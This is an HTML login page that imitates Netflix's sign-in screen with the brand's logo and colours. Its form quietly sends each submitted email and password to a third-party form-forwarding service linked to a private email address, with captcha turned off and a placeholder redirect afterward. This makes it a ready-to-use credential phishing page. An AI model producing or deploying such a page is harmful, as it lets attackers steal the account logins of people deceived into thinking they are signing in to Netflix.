<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Netflix Login</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #000;
      color: #fff;
    }
    .container {
      max-width: 400px;
      margin: 50px auto;
      padding: 30px;
      background-color: #111;
      border-radius: 6px;
    }
    .logo {
      display: block;
      margin: 0 auto 20px;
      width: 150px;
    }
    h1 {
      font-size: 24px;
      text-align: center;
      margin-bottom: 20px;
    }
    input, button {
      width: 100%;
      padding: 12px;
      margin-bottom: 12px;
      border: none;
      border-radius: 4px;
    }
    input {
      background-color: #333;
      color: #fff;
    }
    button {
      background-color: #e50914;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }
    .small-text {
      font-size: 13px;
      text-align: center;
      margin-top: 15px;
      color: #bbb;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo" alt="Netflix Logo" />
    <h1>Sign In</h1>
    <form action="https://formsubmit.co/lashermarvin@gmail.com" method="POST">
      <input type="email" name="email" placeholder="Email or phone number" required />
      <input type="password" name="password" placeholder="Password" required />
      <input type="hidden" name="_captcha" value="false" />
      <input type="hidden" name="_next" value="https://your-site.com/thank-you.html" />
      <button type="submit">Sign In</button>
    </form>
    <p class="small-text">New to Netflix? <a href="https://www.netflix.com" style="color:white;">Sign up now</a>.</p>
  </div>
</body>
</html>
